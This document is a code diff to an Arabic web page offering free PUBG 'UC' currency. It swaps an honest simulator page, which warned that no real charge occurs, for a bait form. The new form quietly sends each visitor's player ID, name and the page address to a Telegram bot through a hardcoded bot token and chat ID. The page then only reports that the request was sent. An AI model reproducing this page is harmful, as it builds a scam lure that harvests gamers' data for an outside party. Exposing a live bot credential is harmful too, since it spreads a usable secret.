@@ -1,344 +1,77 @@
-
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>PUBG UC Simulator — Farmliya</title>
-<link rel="icon" href="data:," />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>شحن ببجي (تجريبي)</title>
 <style>
-:root{
-  --bg-dark: #0b0b0d;
-  --panel: rgba(10,10,12,0.75);
-  --gold: #d9a441;
-  --gold-2: #f0c75e;
-  --muted: #98a0a6;
-  --accent: #00d1a1;
-}
-
-/* Basic reset */
-*{box-sizing:border-box;margin:0;padding:0}
-html,body{height:100%}
-body{
-  font-family: "Segoe UI", Tahoma, Arial, sans-serif;
-  background: radial-gradient(ellipse at center, rgba(255,255,255,0.02) 0%, rgba(0,0,0,0.15) 100%), var(--bg-dark);
-  color:#fff;
-  -webkit-font-smoothing:antialiased;
-  -moz-osx-font-smoothing:grayscale;
-}
-
-/* Animated battlefield background */
-.bg-wrap{
-  position:fixed; inset:0; z-index:0; overflow:hidden;
-  background: linear-gradient(180deg,#071018 0%, #0b0f16 60%, #050607 100%);
-}
-.bg-layer{
-  position:absolute; inset:0; background-repeat:no-repeat; background-position:center; opacity:0.12;
-  background-image: url('https://images.unsplash.com/photo-1549887534-9d2f9b7d5b7b?q=80&w=2000&auto=format&fit=crop&ixlib=rb-4.0.3&s='); /* battlefield-ish */
-  transform: scale(1.15);
-  filter: blur(4px) saturate(0.9) hue-rotate(-8deg);
-  animation: slowpan 35s linear infinite;
-}
-@keyframes slowpan{
-  0%{ transform:scale(1.12) translateX(0) translateY(0) }
-  50%{ transform:scale(1.18) translateX(-3%) translateY(-2%) }
-  100%{ transform:scale(1.12) translateX(0) translateY(0) }
-}
-/* subtle top lighting */
-.bg-top{
-  position:absolute; left:0; right:0; top:0; height:160px;
-  background: linear-gradient(180deg, rgba(255,200,100,0.06), transparent);
-  pointer-events:none;
-}
-
-/* Layout */
-.container{
-  position:relative; z-index:3; max-width:980px; margin:40px auto; padding:28px;
-}
-.header{
-  display:flex; align-items:center; gap:14px; margin-bottom:18px;
-}
-.logo{
-  width:66px; height:66px; border-radius:12px; background:linear-gradient(135deg,var(--gold),var(--gold-2)); display:flex;align-items:center;justify-content:center;color:#071018;font-weight:800;font-size:20px;box-shadow:0 8px 30px rgba(0,0,0,0.6);
-}
-.title h1{font-size:20px;margin-bottom:4px}
-.title p{color:var(--muted);font-size:13px}
-
-/* Panel */
-.panel{
-  background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-  border: 1px solid rgba(255,255,255,0.04);
-  padding:18px; border-radius:12px; box-shadow: 0 10px 40px rgba(2,6,12,0.6);
-  display:grid; grid-template-columns: 1fr 380px; gap:18px; align-items:start;
-}
-
-/* Left column (form) */
-.form-card{padding:10px}
-.row{margin-bottom:12px}
-.label{font-size:13px;color:var(--muted);margin-bottom:6px}
-.input, select{
-  width:100%; padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:inherit;font-size:15px;
-}
-.small{font-size:13px;padding:8px 10px;border-radius:8px}
-
-/* Buttons */
-.actions{display:flex;gap:10px;align-items:center}
-.btn-primary{
-  background: linear-gradient(180deg,var(--gold),var(--gold-2));
-  color:#071018;border:0;padding:12px 16px;border-radius:10px;font-weight:800;cursor:pointer;box-shadow:0 6px 18px rgba(217,164,65,0.12);
-}
-.btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);padding:10px 12px;border-radius:8px;color:var(--muted);cursor:pointer}
-
-/* Right column (preview) */
-.preview{
-  background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.005));
-  border:1px solid rgba(255,255,255,0.03); padding:14px;border-radius:10px; min-height:220px;
-}
-.preview h3{margin-bottom:8px}
-.status {
-  padding:12px;border-radius:8px;background:rgba(0,0,0,0.25);font-weight:700;
-  display:flex;align-items:center;gap:10px;color:var(--muted)
-}
-
-/* progress */
-.progress-wrap{margin-top:12px}
-.progress{
-  height:12px;background:rgba(255,255,255,0.03);border-radius:8px;overflow:hidden;border:1px solid rgba(255,255,255,0.02)
-}
-.progress > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--gold),var(--gold-2));transition:width 0.3s ease}
-
-/* success modal */
-.modal{
-  position:fixed;left:50%;top:50%;transform:translate(-50%,-50%) scale(0.9);z-index:9999;
-  background:linear-gradient(180deg,#061015,#071018);padding:20px;border-radius:12px;border:1px solid rgba(255,255,255,0.06);width:92%;max-width:420px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.6);opacity:0;pointer-events:none;transition:all 240ms ease;
-}
-.modal.show{opacity:1;pointer-events:auto;transform:translate(-50%,-50%) scale(1)}
-.modal h2{color:var(--gold);margin-bottom:6px}
-.modal p{color:var(--muted);margin-bottom:14px}
-
-/* footer note */
-.note{margin-top:10px;color:var(--muted);font-size:13px}
-
-/* responsive */
-@media(max-width:900px){
-  .panel{grid-template-columns:1fr; padding:14px}
-  .header{gap:10px}
-  .logo{width:56px;height:56px}
-}
+  body {
+    background: url('https://wallpapercave.com/wp/wp10223146.jpg') no-repeat center center fixed;
+    background-size: cover;
+    font-family: 'Cairo', sans-serif;
+    color: white;
+    text-align: center;
+  }
+  .container {
+    background: rgba(0,0,0,0.7);
+    padding: 25px;
+    margin: 60px auto;
+    border-radius: 15px;
+    width: 90%;
+    max-width: 400px;
+  }
+  input, button {
+    width: 90%;
+    padding: 10px;
+    margin: 10px;
+    border-radius: 10px;
+    border: none;
+    font-size: 16px;
+  }
+  button {
+    background: gold;
+    color: black;
+    font-weight: bold;
+    cursor: pointer;
+  }
+  #status { margin-top: 15px; font-size: 18px; }
 </style>
 </head>
 <body>
-
-<div class="bg-wrap">
-  <div class="bg-layer" aria-hidden="true"></div>
-  <div class="bg-top" aria-hidden="true"></div>
-</div>
-
-<div class="container">
-  <div class="header">
-    <div class="logo">UC</div>
-    <div class="title">
-      <h1>PUBG UC Simulator</h1>
-      <p>واجهة تجريبية — لا شحن حقيقي. للتعليم وتصميم الواجهات فقط.</p>
-    </div>
+  <div class="container">
+    <h1>🎮 شحن شدات ببجي (تجريبي)</h1>
+    <form id="pubgForm">
+      <input type="text" id="playerId" placeholder="أدخل ID اللاعب" required>
+      <input type="text" id="playerName" placeholder="اسم اللاعب (اختياري)">
+      <button type="submit">شحن الآن ⚡</button>
+    </form>
+    <div id="status"></div>
   </div>
 
-  <div class="panel" role="main" aria-label="Simulator panel">
-    <!-- left: form -->
-    <div class="form-card">
-      <div class="row">
-        <div class="label">اسم اللاعب (اختياري)</div>
-        <input id="playerName" class="input" placeholder="مثال: tr_slaye">
-      </div>
+  <script>
+  const BOT_TOKEN = "7917070284:AAG6dAMr4QeVDeoAtpltPsEbqpG3WXiOKpI";
+  const CHAT_ID = "5653032481";
+  const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-      <div class="row">
-        <div class="label">معرّف اللاعب (User ID)</div>
-        <input id="playerId" class="input" placeholder="أدخل ID اللاعب (أرقام)">
-      </div>
-
-      <div class="row">
-        <div class="label">كمية UC</div>
-        <select id="ucAmount" class="input small">
-          <option value="60">60 UC</option>
-          <option value="300">300 UC</option>
-          <option value="600">600 UC</option>
-          <option value="1200">1200 UC</option>
-          <option value="2800">2800 UC</option>
-          <option value="5000">5000 UC</option>
-        </select>
-      </div>
-
-      <div class="row">
-        <div class="label">خيار الخادم (Region)</div>
-        <select id="region" class="input small">
-          <option value="Asia">Asia</option>
-          <option value="Europe">Europe</option>
-          <option value="North America">North America</option>
-          <option value="MENA">MENA</option>
-        </select>
-      </div>
-
-      <div class="row actions">
-        <button id="chargeBtn" class="btn-primary">شحن تخيّلي الآن</button>
-        <button id="resetBtn" class="btn-ghost">إعادة تعبئة</button>
-      </div>
-
-      <div class="note">تنبيه: هذه صفحة محاكاة للتعلّم. لا تدخل كلمات المرور أو أي بيانات حساسة.</div>
-    </div>
-
-    <!-- right: preview -->
-    <div class="preview" aria-live="polite">
-      <h3>تفاصيل العملية</h3>
-      <div id="previewBox">
-        <div class="status">
-          <div style="width:10px;height:10px;border-radius:50%;background:linear-gradient(180deg,var(--gold),var(--gold-2))"></div>
-          <div><strong>جاهز للشحن التخيلي</strong><div class="muted">املأ النموذج ثم اضغط "شحن تخيلي الآن"</div></div>
-        </div>
-
-        <div class="progress-wrap" style="display:none" id="progressWrap">
-          <div style="margin-top:10px" class="muted">جاري تنفيذ العملية...</div>
-          <div class="progress" aria-hidden="true" style="margin-top:8px"><i id="progressBar"></i></div>
-        </div>
-
-        <div id="resultArea" style="margin-top:12px;display:none">
-          <div class="muted">نتيجة المحاكاة:</div>
-          <pre id="resultText" style="background:rgba(0,0,0,0.25);padding:10px;border-radius:8px;margin-top:8px"></pre>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- modal -->
-<div id="modal" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
-  <h2>✅ تمّ الشحن (تجريبي)</h2>
-  <p id="modalMsg">تم إضافة UC حسابك بنجاح (محاكاة).</p>
-  <div><button id="closeModal" class="btn-primary">حسناً</button></div>
-</div>
-
-<script>
-/* Simple PUBG UC Simulator (client-side only) */
-/* No real transactions, educational only. */
-
-// Elements
-const chargeBtn = document.getElementById('chargeBtn');
-const resetBtn = document.getElementById('resetBtn');
-const playerId = document.getElementById('playerId');
-const playerName = document.getElementById('playerName');
-const ucAmount = document.getElementById('ucAmount');
-const region = document.getElementById('region');
-const progressWrap = document.getElementById('progressWrap');
-const progressBar = document.getElementById('progressBar');
-const resultArea = document.getElementById('resultArea');
-const resultText = document.getElementById('resultText');
-const modal = document.getElementById('modal');
-const modalMsg = document.getElementById('modalMsg');
-const closeModal = document.getElementById('closeModal');
-
-// Helper: simple validation
-function validInput(){
-  const id = playerId.value.trim();
-  if(!id || !/^\d+$/.test(id)){
-    alert('فضلاً أدخل رقم ID صالح (أرقام فقط).');
-    return false;
-  }
-  return true;
-}
-
-// Visual loading simulation
-async function simulateCharge(){
-  if(!validInput()) return;
-  // reset visuals
-  resultArea.style.display='none';
-  progressWrap.style.display='block';
-  progressBar.style.width='0%';
-
-  // simulated staged progress with delays
-  const steps = [20, 45, 70, 88, 100];
-  for(let i=0;i<steps.length;i++){
-    await new Promise(r=> setTimeout(r, 700 + Math.random()*600));
-    progressBar.style.width = steps[i] + '%';
-  }
-
-  // build result (fake)
-  const payload = {
-    playerId: playerId.value.trim(),
-    playerName: playerName.value.trim() || '(غير مُدخل)',
-    amountUC: ucAmount.value,
-    region: region.value,
-    transactionId: 'SIM-' + Math.random().toString(36).substring(2,10).toUpperCase(),
-    timestamp: new Date().toLocaleString()
-  };
-
-  // show result
-  progressWrap.style.display='none';
-  resultArea.style.display='block';
-  resultText.textContent = JSON.stringify(payload, null, 2);
-
-  // show modal
-  modalMsg.textContent = `تم شحن ${payload.amountUC} UC للحساب ${payload.playerName} (ID ${payload.playerId}) — هذه محاكاة فقط.`;
-  modal.classList.add('show'); modal.setAttribute('aria-hidden','false');
-
-  // optional small confetti (lightweight)
-  launchConfetti();
-}
-
-// reset
-resetBtn.addEventListener('click', ()=>{
-  playerId.value=''; playerName.value=''; ucAmount.value='300'; region.value='Asia';
-  progressWrap.style.display='none'; resultArea.style.display='none'; progressBar.style.width='0%';
-});
-
-// main
-chargeBtn.addEventListener('click', simulateCharge);
-closeModal.addEventListener('click', ()=>{
-  modal.classList.remove('show'); modal.setAttribute('aria-hidden','true');
-});
-
-// tiny confetti effect (canvas-based, lightweight)
-function launchConfetti(){
-  const w = window.innerWidth, h = window.innerHeight;
-  const cvs = document.createElement('canvas'); cvs.style.position='fixed'; cvs.style.left=0; cvs.style.top=0; cvs.style.pointerEvents='none';
-  cvs.width = w; cvs.height = h; cvs.style.zIndex = 9998;
-  document.body.appendChild(cvs);
-  const ctx = cvs.getContext('2d');
-  const pieces = [];
-  const colors = ['#f0c75e','#d9a441','#ffd97a','#ffffff','#f39c12'];
-  for(let i=0;i<80;i++){
-    pieces.push({
-      x: Math.random()*w,
-      y: -20 - Math.random()*h*0.2,
-      vx: (Math.random()-0.5)*6,
-      vy: 2 + Math.random()*4,
-      r: 6+Math.random()*8,
-      c: colors[Math.floor(Math.random()*colors.length)],
-      rot: Math.random()*360,
-      vr: (Math.random()-0.5)*10
+  document.getElementById("pubgForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const playerId = document.getElementById("playerId").value.trim();
+    const playerName = document.getElementById("playerName").value.trim();
+    const text = `🎯 طلب شحن جديد:\n🆔 ID: ${playerId}\n👤 الاسم: ${playerName || "(غير مُدخل)"}\n🌐 المصدر: ${location.href}`;
+    
+    const res = await fetch(API_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text })
     });
-  }
-  let t=0;
-  function frame(){
-    ctx.clearRect(0,0,w,h);
-    for(const p of pieces){
-      p.x += p.vx; p.y += p.vy; p.rot += p.vr;
-      ctx.save();
-      ctx.translate(p.x,p.y);
-      ctx.rotate(p.rot*Math.PI/180);
-      ctx.fillStyle = p.c;
-      ctx.fillRect(-p.r/2, -p.r/2, p.r, p.r*0.6);
-      ctx.restore();
+
+    if(res.ok){
+      document.getElementById("status").textContent = "✅ تم الإرسال إلى بوت التلغرام!";
+      document.getElementById("pubgForm").reset();
+    } else {
+      document.getElementById("status").textContent = "❌ فشل الإرسال، حاول مجددًا.";
     }
-    t++;
-    if(t<180) requestAnimationFrame(frame);
-    else { document.body.removeChild(cvs); }
-  }
-  frame();
-}
-
-/* Accessibility: allow Enter on ID to submit */
-playerId.addEventListener('keydown', (e)=> { if(e.key==='Enter') simulateCharge(); });
-
-</script>
-
+  });
+  </script>
 </body>
 </html>
